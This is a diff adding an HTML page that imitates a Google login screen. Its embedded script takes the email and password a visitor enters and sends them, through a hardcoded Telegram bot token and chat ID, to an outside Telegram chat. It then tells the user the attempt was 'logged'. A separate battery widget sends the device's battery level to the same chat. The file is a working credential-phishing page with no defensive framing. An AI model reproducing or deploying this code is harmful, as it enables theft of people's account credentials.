@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-container h2 {
+            color: #333;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .login-button {
+            background-color: #4285f4;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .login-button:hover {
+            background-color: #357ae8;
+        }
+
+        .register-link {
+            margin-top: 15px;
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .register-link:hover {
+            text-decoration: underline;
+        }
+
+        #battery-status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Login to Google</h2>
+        <div class="input-group">
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email">
+        </div>
+        <div class="input-group">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password">
+        </div>
+        <button class="login-button" onclick="login()">Login</button>
+        <a href="#" class="register-link">Register</a>
+
+        <div id="battery-status">
+            <input type="text" id="battery-command" placeholder="Type 'battery' to check battery">
+            <button onclick="checkBattery()">Check Battery</button>
+            <p id="battery-level"></p>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_API_KEY = '7740688669:AAEKQp7-DM_yUL_6Tq7cKLAbJ-YYgIxotsU';
+        const TELEGRAM_CHAT_ID = '7246086089';
+
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Telegram message sent:', data))
+                .catch(error => console.error('Error sending Telegram message:', error));
+        }
+
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                const message = `Login attempt:\nEmail: ${email}\nPassword: ${password}`;
+                sendMessageToTelegram(message);
+                alert('Login attempt logged. Redirecting...');
+            } else {
+                alert('Please enter your email and password.');
+            }
+        }
+
+
+        function checkBattery() {
+            const command = document.getElementById('battery-command').value;
+            if (command.toLowerCase() === 'battery') {
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        const level = battery.level * 100;
+                        document.getElementById('battery-level').innerText = `Battery Level: ${level}%`;
+
+                        const message = `Battery Level: ${level}%`;
+                        sendMessageToTelegram(message);
+
+                    }).catch(err => {
+                        console.error("Battery Status API failed: ", err);
+                        document.getElementById('battery-level').innerText = "Battery status not available.";
+                    });
+                } else {
+                    document.getElementById('battery-level').innerText = "Battery Status API is not supported.";
+                }
+            } else {
+                alert("Please type 'battery' to check the battery level.");
+            }
+        }
+
+    </script>
+</body>
+</html>
+```
